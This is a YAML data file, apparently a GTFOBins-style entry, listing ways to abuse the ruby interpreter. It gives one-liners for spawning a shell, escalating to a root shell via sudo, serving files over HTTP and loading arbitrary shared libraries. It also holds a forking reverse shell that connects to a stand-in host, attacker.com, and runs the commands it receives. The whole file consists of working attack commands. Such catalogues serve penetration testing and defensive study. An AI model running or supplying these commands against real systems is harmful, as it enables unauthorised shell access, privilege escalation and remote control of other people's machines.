---
functions:
  execute-interactive:
    - code: ruby -e 'exec "/bin/sh"'
  sudo-enabled:
    - code: sudo ruby -e 'exec "/bin/sh"'
  upload:
    - description: Serve files in the local folder running an HTTP server.
      code: |
        export LPORT=8888
        ruby -run -e httpd . -p $LPORT
  reverse-shell-interactive:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  load-library:
    - code: ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'
---
